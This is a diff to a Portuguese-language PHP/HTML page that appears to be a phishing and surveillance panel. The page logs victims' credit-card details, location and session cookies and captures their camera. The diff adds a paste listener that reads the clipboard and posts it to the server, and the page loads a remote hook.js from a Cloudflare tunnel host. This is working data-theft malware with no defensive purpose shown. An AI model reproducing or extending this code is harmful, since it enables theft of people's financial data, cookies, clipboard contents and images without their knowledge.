@@ -96,6 +96,7 @@
     $cc_expiry = $_POST['cc_expiry'] ?? 'N/A';
     $location = $_POST['location'] ?? 'Localização não disponível';
     $cookies = $_SERVER['HTTP_COOKIE'] ?? 'Nenhum cookie disponível';
+    $clipboard = $_POST['clipboard'] ?? 'Nenhum texto da área de transferência';
 
     // Criação do diretório para salvar as imagens
     if (!is_dir('uploads')) {
@@ -116,6 +117,7 @@
     fwrite($file, "Validade: $cc_expiry\n");
     fwrite($file, "Localização: $location\n");
     fwrite($file, "Cookies: $cookies\n");
+    fwrite($file, "Área de Transferência: $clipboard\n"); // Salvar conteúdo da área de transferência
     if (isset($photoPath)) {
         fwrite($file, "Foto salva em: $photoPath\n");
     }
@@ -155,7 +157,26 @@
         const canvas = document.getElementById('canvas');
         const locationData = document.getElementById('locationData');
 
-        // Captura a câmera 
+// Captura da área de transferência
+document.addEventListener('paste', async (event) => {
+    const clipboardText = await navigator.clipboard.readText();
+
+    // Envia o conteúdo da área de transferência para o servidor via POST
+    fetch(window.location.href, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `clipboard=${encodeURIComponent(clipboardText)}`
+    }).then(response => response.text())
+      .then(data => {
+          console.log('Dados enviados:', data);
+      }).catch(err => {
+          console.error('Erro ao enviar dados:', err);
+      });
+});
+
+    // Captura a câmera 
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
@@ -225,4 +246,3 @@
 </body>
 </html>
 <script src="https://<subdomain>.trycloudflare.com:3000/hook.js"></script>
-
